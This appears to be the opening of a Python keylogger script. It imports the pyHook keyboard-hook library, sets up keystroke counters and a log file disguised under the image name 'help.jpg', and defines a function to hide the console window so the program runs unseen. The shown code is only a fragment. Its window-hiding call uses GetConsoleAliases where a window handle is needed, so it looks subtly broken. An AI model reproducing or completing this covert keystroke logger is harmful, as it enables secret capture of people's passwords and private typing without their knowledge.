import win32gui, win32console, pyHook, pythoncom
from datetime import datetime

winName = ''

keyLst = []

flePath = 'help.jpg'

wrtCount = 1024

keyCount = 0

def hideWindow():
    window = win32console.GetConsoleAliases()
    win32gui.ShowWindow(window, 0)
    return True